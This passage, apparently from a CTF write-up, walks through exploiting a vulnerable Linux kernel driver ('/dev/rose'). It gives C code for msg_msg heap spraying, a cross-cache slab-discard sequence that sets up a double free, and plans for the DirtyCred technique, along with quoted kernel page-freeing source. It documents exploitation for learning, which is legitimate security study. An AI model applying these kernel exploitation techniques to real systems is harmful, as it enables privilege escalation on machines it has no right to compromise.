</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">n_previctim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="o">*</span> <span class="n">n_postvictim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">init_msq</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">overflow_objs</span><span class="p">,</span> <span class="n">n_overflow</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">    <span class="nf">init_msq</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">pre_victim_objs</span><span class="p">,</span> <span class="n">n_previctim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">init_msq</span><span class="p">(</span><span class="n">cc</span><span class="o">-&gt;</span><span class="n">post_victim_objs</span><span class="p">,</span> <span class="n">n_postvictim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">cc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">rlimit_increase</span><span class="p">(</span><span class="kt">int</span> <span class="n">rlimit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">r</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">getrlimit</span><span class="p">(</span><span class="n">rlimit</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fatal</span><span class="p">(</span><span class="s">&#34;rlimit_increase:getrlimit&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">&lt;=</span> <span class="n">r</span><span class="p">.</span><span class="n">rlim_cur</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] rlimit %d remains at %.lld&#34;</span><span class="p">,</span> <span class="n">rlimit</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">rlim_cur</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">rlim_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">=</span> <span class="nf">setrlimit</span><span class="p">(</span><span class="n">rlimit</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">r</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="nf">fatal</span><span class="p">(</span><span class="s">&#34;rlimit_increase:setrlimit&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] rlimit %d increased to %lld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">rlimit</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">rlim_max</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int64_t</span> <span class="nf">cc_alloc_kmalloc1k_msg</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">msqid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">mtype</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">mtext</span><span class="p">[</span><span class="n">MSG_SIZE</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span><span class="p">.</span><span class="n">mtype</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">mtext</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="n">MSG_SIZE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span><span class="p">.</span><span class="n">mtext</span><span class="p">[</span><span class="n">MSG_SIZE</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">msgsnd</span><span class="p">(</span><span class="n">msqid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">mtext</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">msqid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">cc_free_kmalloc1k_msg</span><span class="p">(</span><span class="kt">int64_t</span> <span class="n">msqid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">mtype</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="n">mtext</span><span class="p">[</span><span class="n">MSG_SIZE</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">msg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">msg</span><span class="p">.</span><span class="n">mtype</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="nf">msgrcv</span><span class="p">(</span><span class="n">msqid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">mtext</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">IPC_NOWAIT</span> <span class="o">|</span> <span class="n">MSG_NOERROR</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">open_rose</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/rose&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Above is the modified version of the script we used. We made a couple of adjustments from the original script, including:</p>
<ul>
<li>In the <code>cc_free</code> section, we made it so that when <code>per_slab</code> is flagged as <code>true</code>, it only frees one object per slab.</li>
<li>For the object spray, since the kernel setting <code>CONFIG_MEMCG_KMEM</code> is turned off, we can use <code>msg_msg</code> objects in <code>kmalloc-1k</code> for this. (Just a note, if this setting were enabled, <code>msg_msg</code> wouldn&rsquo;t be in the same cache area as <code>rose</code>, so we&rsquo;d need to find a different object to spray it).</li>
</ul>
<p>Now that we&rsquo;ve identified the specifics regarding the number of objects required to fill a slab and the count of slabs necessary to fill the CPU partial list, it&rsquo;s time to initiate the discard slab process. Taking a cue from the guidelines in the write-up, here is what we need to do to trigger a <code>discard_slab</code>:</p>
<ol>
<li>Start by allocating a significant number of slabs, exceeding the upper limit defined by <code>CPU_PARTIAL</code>.</li>
<li>Then, focus on the target slab we aim to discard. Ensure to allocate it without filling it completely, leaving room to allocate the <code>rose</code> object later.</li>
<li>Next, allocate the <code>rose</code> object, which, ideally, should find a place in the slab we prepared in the previous step.</li>
<li>Moving forward, fill up the target slab until it&rsquo;s full, activating a new slab in the process.</li>
<li>The next move is to empty our target slab. This involves releasing the <code>rose</code> object along with others that are housed within the slab.</li>
<li>Now, with an empty target slab at hand, we free up at least one object from the other slabs that are not active at the moment.
<ul>
<li>The objective here is to max out the partial list, a condition met when it holds <code>CPU_PARTIAL</code> number of slabs.</li>
</ul>
</li>
<li>Presuming the partial list is filled to capacity, freeing an additional object from a non-active slab (also not part of the partial list) activates <code>unfreeze_partials</code>.
<ul>
<li>This function scans through the slabs in the partial list, discarding any that are found empty.</li>
</ul>
</li>
<li>Bear in mind that we emptied our chosen slab (slab of the <code>rose</code> object) earlier. This means that during the above step, our slab gets discarded, making its way to the freelist.</li>
</ol>
<p>To put this all into action, we&rsquo;ll use the abstraction we described earlier. Here&rsquo;s how the code looks:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">rose_fds</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">freed_fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define NUM_SPRAY_FDS 0x300
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;=======================&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Initial setup&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;echo &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; &gt; /tmp/a&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">rlimit_increase</span><span class="p">(</span><span class="n">RLIMIT_NOFILE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Alloc the first rose
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// This will be used later to trigger double free
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">rose_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open_rose</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;=======================&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Try to free the page&#34;</span><span class="p">);</span> <span class="c1">// Based on https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">kmalloc1k_cc</span> <span class="o">=</span> <span class="nf">cc_init</span><span class="p">(</span><span class="n">OBJS_PER_SLAB</span><span class="p">,</span> <span class="n">CPU_PARTIAL</span><span class="p">,</span> <span class="n">cc_alloc_kmalloc1k_msg</span><span class="p">,</span> <span class="n">cc_free_kmalloc1k_msg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">     <span class="c1">// Step 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 1: Allocate a lot of slabs (To be put in the partial list later)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_next</span><span class="p">(</span><span class="n">kmalloc1k_cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Step 2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 2: Allocate target slab that we want to discard&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_next</span><span class="p">(</span><span class="n">kmalloc1k_cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Step 3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 3: Put rose in the target slab&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">rose_fds</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nf">open_rose</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Step 4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 4: Fulfill the target slab until we have a new active slab&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_next</span><span class="p">(</span><span class="n">kmalloc1k_cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Step 5
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 5: Try to free rose &amp; other objects with hope that the target slab will be empty + be put in the partial list&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Free rose, but rose_fds[0] also pointing to the same chunk,
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// and we can use rose_fds[0] later to free other chunk that resides in here
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">close</span><span class="p">(</span><span class="n">rose_fds</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_next</span><span class="p">(</span><span class="n">kmalloc1k_cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Step 6
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;[+] Step 6: Fulfill the partial list and discard the target slab (because it&#39;s empty) to per_cpu_pages&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">cc_next</span><span class="p">(</span><span class="n">kmalloc1k_cc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Some extra notes:</p>
<ul>
<li>We&rsquo;ve created a file called <code>/tmp/a</code>, which we plan to use later to trigger the <code>DirtyCred</code> technique.</li>
<li>Importantly, we initiate the allocation of the <code>rose</code> object prior to setting the cross-cache process. We want to have two file descriptors pointing to the same chunk, with hope that it will help us to invoke a double free scenario later on.</li>
</ul>
<p>Following the execution of the script outlined above, theoretically, the targeted slab should have been discarded and will reside in the freelist zone. To debug this, I just set a breakpoint in both <code>rose_release</code> and <code>discard_slab</code> to get the <code>data</code> address and to confirm if the <code>discard_slab</code> is indeed trying to discard the slab of the <code>rose</code> data.</p>
<p>However, during the competition, I failed to spray the <code>file</code> objects in our previously discarded slab&rsquo;s page (the page wasn&rsquo;t recycled somehow). I tried to check the <code>/proc/slabinfo</code>, where I discovered a new info, that the <code>kmalloc-1k</code> page was at order 1, while the <code>file</code> object (256-byte) was placed at page order 0.</p>
<p>Initially, checking on another <a href="https://etenal.me/archives/1825" target="_blank" rel="noopener noreffer ">writeup</a> on Page-level heap fengshui, I presumed that an empty page order 0 freelist would resort to use the higher-order freelist, which in this case, was our discarded page. Although this was accurate, I overlooked a crucial step.</p>
<p>My teammate, cru5h, highlighted that the page we released earlier was still resided in the <code>per_cpu_pages</code> (pcp) freelist. He said that I needed to release the page once more to transfer it to the buddy system&rsquo;s free area. In the buddy, when a lower order page&rsquo;s free area is empty, it will try to use the freelist of a higher-order page (which is exactly the outcome we were aiming for). He helped me in this part and provided me a working script which has made the free page back to the buddy system.</p>
<p>On a side note, I try to deep dive into the Linux kernel&rsquo;s code while trying to discard a slab, which helps me a lot to understand on this issue.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">discard_slab</span><span class="p">(</span><span class="k">struct</span> <span class="n">kmem_cache</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="k">struct</span> <span class="n">slab</span> <span class="o">*</span><span class="n">slab</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free_slab</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">slab</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">free_slab</span><span class="p">(</span><span class="k">struct</span> <span class="n">kmem_cache</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="k">struct</span> <span class="n">slab</span> <span class="o">*</span><span class="n">slab</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">...</span>
</span></span><span class="line"><span class="cl">		<span class="nf">__free_slab</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">slab</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">__free_slab</span><span class="p">(</span><span class="k">struct</span> <span class="n">kmem_cache</span> <span class="o">*</span><span class="n">s</span><span class="p">,</span> <span class="k">struct</span> <span class="n">slab</span> <span class="o">*</span><span class="n">slab</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">folio</span> <span class="o">*</span><span class="n">folio</span> <span class="o">=</span> <span class="nf">slab_folio</span><span class="p">(</span><span class="n">slab</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">order</span> <span class="o">=</span> <span class="nf">folio_order</span><span class="p">(</span><span class="n">folio</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">pages</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">order</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">...</span>
</span></span><span class="line"><span class="cl">	<span class="nf">__free_pages</span><span class="p">(</span><span class="nf">folio_page</span><span class="p">(</span><span class="n">folio</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="n">order</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">__free_pages</span><span class="p">(</span><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="cm">/* get PageHead before we drop reference */</span>
</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">head</span> <span class="o">=</span> <span class="nf">PageHead</span><span class="p">(</span><span class="n">page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">put_page_testzero</span><span class="p">(</span><span class="n">page</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="nf">free_the_page</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">order</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">head</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="k">while</span> <span class="p">(</span><span class="n">order</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nf">free_the_page</span><span class="p">(</span><span class="n">page</span> <span class="o">+</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">order</span><span class="p">),</span> <span class="n">order</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">void</span> <span class="nf">free_the_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">pcp_allowed_order</span><span class="p">(</span><span class="n">order</span><span class="p">))</span>		<span class="cm">/* Via pcp? */</span>
</span></span><span class="line"><span class="cl">		<span class="nf">free_unref_page</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">order</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span>
</span></span><span class="line"><span class="cl">		<span class="nf">__free_pages_ok</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">order</span><span class="p">,</span> <span class="n">FPI_NONE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">free_unref_page</span><span class="p">(</span><span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">order</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="p">...</span>
</span></span><span class="line"><span class="cl">	<span class="n">pcp</span> <span class="o">=</span> <span class="nf">pcp_spin_trylock_irqsave</span><span class="p">(</span><span class="n">zone</span><span class="o">-&gt;</span><span class="n">per_cpu_pageset</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">pcp</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">free_unref_page_commit</span><span class="p">(</span><span class="n">zone</span><span class="p">,</span> <span class="n">pcp</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">migratetype</span><span class="p">,</span> <span class="n">order</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">pcp_spin_unlock_irqrestore</span><span class="p">(</span><span class="n">pcp</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">free_one_page</span><span class="p">(</span><span class="n">zone</span><span class="p">,</span> <span class="n">page</span><span class="p">,</span> <span class="n">pfn</span><span class="p">,</span> <span class="n">order</span><span class="p">,</span> <span class="n">migratetype</span><span class="p">,</span> <span class="n">FPI_NONE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pcp_trylock_finish</span><span class="p">(</span><span class="n">UP_flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">free_unref_page_commit</span><span class="p">(</span><span class="k">struct</span> <span class="n">zone</span> <span class="o">*</span><span class="n">zone</span><span class="p">,</span> <span class="k">struct</span> <span class="n">per_cpu_pages</span> <span class="o">*</span><span class="n">pcp</span><span class="p">,</span>
